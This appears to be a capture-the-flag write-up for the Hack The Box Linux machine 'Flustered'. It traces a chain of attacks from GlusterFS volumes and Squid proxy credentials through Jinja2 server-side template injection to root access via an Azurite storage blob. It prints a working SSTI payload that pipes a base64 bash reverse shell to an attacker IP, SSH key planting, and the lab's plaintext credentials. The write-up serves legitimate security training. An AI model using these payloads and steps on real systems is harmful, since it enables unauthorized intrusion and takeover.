@@ -1,0 +1,221 @@
+                    Flustered
+
+                                                                           24th January 2022 / Document No. D22.100.153
+                                                                           Prepared By: polarbearer
+                                                                           Machine Author(s): polarbearer
+                                                                           Difficulty: Medium
+                                                                           Classification: Official
+
+                              Synopsis
+
+Flustered is a medium difficulty Linux machine which showcases two different storage solutions (GlusterFS
+and the Azure Storage emulator Azurite) that can be accessed at different stages in order to obtain different
+levels of access to the system. First, unauthenticated mount of a GlusterFS volume allows attackers to read
+Squid credentials from a database, granting access to a local HTTP server where the source code of the
+main web application can be read, discovering an SSTI vulnerabilty that results in remote command
+execution. World-readable SSL certificates allow access to a second GlusterFS volume that is mounted as
+/home , where public keys can be planted in order to SSH in as a second user. Finally, an Azure Storage blob
+contains a public SSH key for the root user.
+
+Skills Required
+
+      Enumeration
+      Pivoting
+      MySQL / MariaDB knowledge
+
+Skills Learned
+
+      Mounting GlusterFS volumes
+      Identifying and exploiting SSTI vulnerabilities
+      Accessing Azure Storage
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.131 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC -Pn 10.10.11.131
+
+Nmap scan shows that OpenSSH, nginx and Squid are listening on their default ports. A few more ports,
+which Nmap identified as rpcbind , are open.
+
+Nginx
+
+Browsing to port 80 we see an empty page with a background image but no actual content.
+The page title is steampunk-era.htb - Coming Soon , which means the web site is still under development.
+
+Squid
+
+The Squid proxy requires authentication.
+   curl --proxy http://10.10.11.131:3128 http://10.10.11.131
+
+GlusterFS
+
+A quick web search reveals that 24007 and 49152 are standard Gluster ports. After installing the GlusterFS
+client, we can run the following command to list the available volumes:
+
+   gluster --remote-host=10.10.11.131 volume list
+Two volumes, namely vol1 and vol2 , are returned. Attempting to mount any of the volumes results in an
+error:
+
+   sudo mount -t glusterfs 10.10.11.131:/vol1 /mnt/
+
+The log file ( /var/log/glusterfs/mnt.log ) shows additional information about the mount failure, which
+seems to be caused by a DNS resolution error:
+
+We add an entry to the /etc/hosts file and attempt to mount vol1 again:
+   echo "10.10.11.131 flustered.htb flustered" | sudo tee -a /etc/hosts
+   sudo mount -t glusterfs flustered:/vol1 /mnt/
+
+This fails again, and the log file shows an SSL related error:
+
+While unable to mount vol1 , we can instead successfully mount vol2 :
+   sudo mount -t glusterfs flustered:/vol2 /mnt/
+The volume contains MariaDB files (more precisely, it contains what is usually found in the /var/lib/mysql
+directory):
+
+Foothold
+
+Having obtained access to MariaDB files, we are now able to read data stored in the database tables. The
+mysql_upgrade_info file reveals the MariaDB version:
+
+We can run our own MariaDB server (using the same version as above to ensure compatibility) copying data
+from vol2 into /var/lib/mysql . This can be easily accomplished using Docker, enabling auth_socket
+authentication to avoid entering a password:
+   mkdir /tmp/mysql
+   cp -R /mnt/* /tmp/mysql/
+   echo -e "[mariadb]\nplugin-load-add = auth_socket.so" > /tmp/socket.cnf
+   docker run --name mariadb -v /tmp/socket.cnf:/etc/mysql/mariadb.conf.d/socket.cnf -v
+   /tmp/mysql:/var/lib/mysql -d mariadb:10.3.31
+   docker exec -ti mariadb mysql
+We can now read data from the passwd table in the squid database:
+
+A quicker way to obtain the same information without running MariaDB server would be to use the
+strings command:
+
+Either way, we have obtained a user named lance.friedman with password o>WJ5-jD<5^m3 . Using these
+credentials, we can successfully authenticate to Squid:
+
+   curl --proxy http://lance.friedman:'o>WJ5-jD<5^m3'@10.10.11.131:3128
+   http://10.10.11.131/
+The proxy allows us to access the web server at http://127.0.0.1, which shows the default Nginx welcome
+page. This suggests that the local server listening on 127.0.0.1:80, which is enabled by default in
+/etc/nginx/sites-enabled/default on Debian systems, has not been disabled.
+
+We run gobuster (notice that we have to URL-encode some characters in order to get a valid userinfo ):
+   gobuster dir -u http://127.0.0.1 --proxy 'http://lance.friedman:o%3EWJ5-
+   jD%3C5%5Em3@10.10.11.131:3128' -w /usr/share/dirb/wordlists/common.txt
+A directory called /app was found. Requesting it results in a 403 error:
+   curl --proxy http://lance.friedman:'o>WJ5-jD<5^m3'@10.10.11.131:3128
+   http://127.0.0.1/app/
+
+Searching for Python files inside the /app directory, a file named app.py is found:
+   gobuster dir -q -u http://127.0.0.1/app --proxy 'http://lance.friedman:o%3EWJ5-
+   jD%3C5%5Em3@10.10.11.131:3128' -w /usr/share/dirb/wordlists/common.txt -x py
+
+We can read it:
+   curl --proxy http://lance.friedman:'o>WJ5-jD<5^m3'@10.10.11.131:3128
+   http://127.0.0.1/app/app.py
+
+   from flask import Flask, render_template_string, url_for, json, request
+   app = Flask(__name__)
+
+   def getsiteurl(config):
+      if config and "siteurl" in config:
+          return config["siteurl"]
+      else:
+          return "steampunk-era.htb"
+
+   @app.route("/", methods=['GET', 'POST'])
+   def index_page():
+
+      # Will replace this with a proper file when the site is ready
+      config = request.json
+
+      template = f'''
+          <html>
+          <head>
+          <title>{getsiteurl(config)} - Coming Soon</title>
+          </head>
+          <body style="background-image: url('{url_for('static', filename='steampunk-
+
+   3006650_1280.webp')}');background-size: 100%;background-repeat: no-repeat;">
+          </body>
+          </html>
+
+      '''
+      return render_template_string(template)
+
+   if __name__ == "__main__":
+      app.run()
+
+The siteurl field is parsed from a JSON object in the request body and added to the page template, which
+is then rendered via render_template_string() . This makes the application vulnerable to Server-Side
+Template Injection. We can verify the vulnerability by sending the {{7*7}} payload:
+
+   curl -H "Content-Type: application/json" -d '{"siteurl":"{{7*7}}"}'
+   http://flustered.htb
+It worked as expected: the payload was executed and the result ( 49 ) was returned. We turn this into a
+reverse shell by using a common Jinja2 RCE payload. First we base64-encode a bash reverse shell line:
+
+   echo "/bin/bash -c 'bash -i &>/dev/tcp/10.10.14.22/7777 0>&1'"|base64 -w0; echo
+
+We open a listener on port 7777 and then send the following request:
+   curl -H "Content-Type: application/json" -d '{"siteurl":"{% for x in
+   ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}
+   {{x()._module.__builtins__[\"__import__\"](\"os\").system(\"echo
+   L2Jpbi9iYXNoIC1jICdiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMjIvNzc3NyAwPiYxJwo=|base64 -
+   d|bash\")}}{%endif%}{% endfor %}"}' http://flustered.htb
+
+A reverse shell as www-data is received.
+
+Lateral Movement
+
+Running the mount command we see that the GlusterFS volume vol1 , which we were unable to mount
+remotely due to SSL certificate issues, is mounted locally to the /home/jennifer directory:
+As shown in the Gluster documentation, SSL key and certificates are located in the /etc/ssl directory.
+
+All three files are world-readable (including glusterfs.key , which is not by default, meaning its
+permissions were changed), so we can copy them to our local /etc/ssl directory. This allows us to mount
+the vol1 volume from our attacking machine:
+
+   mkdir /mnt/jennifer
+   mount -t glusterfs flustered:/vol1 /mnt/jennifer
+We can read the user flag in /mnt/jennifer/user.txt and put our public key in .ssh/authorized_keys
+in order to get a shell as jennifer .
+   cat ~/.ssh/id_rsa.pub >> /mnt/jennifer/.ssh/authorized_keys
+   ssh jennifer@flustered
+
+Privilege Escalation
+
+The /var/backups directory contains a key file which is readable by the jennifer group:
+
+The file contains base64-encoded data:
+
+The ip a command shows that the machine has an interface on a Docker network, with IP address
+172.17.0.2:
+We discover a running container with IP address 172.17.0.2.
+
+We use SSH dynamic port forwarding to run nmap through proxychains:
+   ssh -N -D 1080 jennifer@flustered
+   proxychains nmap -Pn -sT -T4 -v 172.17.0.2 2>&1 | grep -v error
+
+Open port 10000 was discovered. We make a cURL request to this port:
+Searching the web for InvalidQueryParameterValue , we find out it is an error related to Azure Storage. In
+fact, port 10000 is used as default port by the Azurite emulator.
+To be able to interact with the Azure Storage instance, we download and install the Azure Storage Explorer
+application. We use SSH local port forwarding to access the service locally:
+
+   ssh -N -L10000:172.17.0.2:10000 jennifer@flustered
+We run Storage Explorer and add a new connection to a Local Storage Emulator:
+
+We enter jennifer as the Account name and the base64 data from /var/backups/key as the Account
+key:
+Two blob containers, documents and ssh-keys , are available.
+From the ssh-keys container we can download a file named root.key .
+
+We can use this key to SSH to the system as root :
+   chmod 400 root.key ; ssh -i root.key root@flustered
+The root flag can be found in /root/root.txt .
+
